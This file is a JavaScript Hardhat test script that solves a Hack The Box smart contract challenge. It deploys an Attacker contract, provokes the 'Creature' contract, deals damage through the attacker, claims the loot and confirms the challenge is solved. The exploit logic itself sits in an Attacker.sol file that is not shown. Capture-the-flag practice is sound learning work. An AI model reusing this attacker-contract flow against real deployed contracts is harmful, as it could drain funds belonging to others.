/*
    This script connect to the target and run the 
    functions needed to get the htb flag
*/

const { expect } = require('chai');
require('dotenv').config();

// .Env data to interact with the smart contracts
const {
    PRIV_KEY,
    ADDRESS,
    TARGET_ADDRESS,
    SETUP_ADDRESS
} = process.env;

// Smart contract names
const SETUP = 'Setup';
const TARGET = 'Creature';
const ATTACKER = 'Attacker';

describe("HTB flag flow :)", function () {

    let contractSetup;
    let contractTarget;
    let contractAttacker;

    it('[ Instantiate ] Setup.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(SETUP);
        contractSetup = await Contract.attach(SETUP_ADDRESS);
        expect(contractSetup.target).to.be.equal(SETUP_ADDRESS);

    });

    it('[ Instantiate ] Creature.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(TARGET);
        contractTarget = await Contract.attach(TARGET_ADDRESS);
        expect(contractTarget.target).to.be.equal(TARGET_ADDRESS);

    });
    
    it('[ Deploy and Instantiate ] Attacker.sol', async () => {

        const Contract = await hre.ethers.getContractFactory(ATTACKER);
        contractAttacker =  await Contract.deploy(TARGET_ADDRESS);
        expect(contractTarget.runner.address).to.be.equal(ADDRESS);

    });


    it('[ Target ] Calling the smart contract to get the aggro of the creature', async () => {

        const response = await contractTarget.attack(100);
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Attacker ] Calling the smart contract function to do the damage', async () => {

        const response = await contractAttacker.attackCreature(1000);
        expect(response.from).to.be.equal(ADDRESS);

    });


    it('[ Target ] Claim the loot', async () => {

        const response = await contractTarget.loot();
        expect(response.from).to.be.equal(ADDRESS);

    });

    it('[ Setup ] Checking if is solved = true', async () => {

        const response = await contractSetup.isSolved();
        expect(response).to.be.equal(true);

    });
    

});
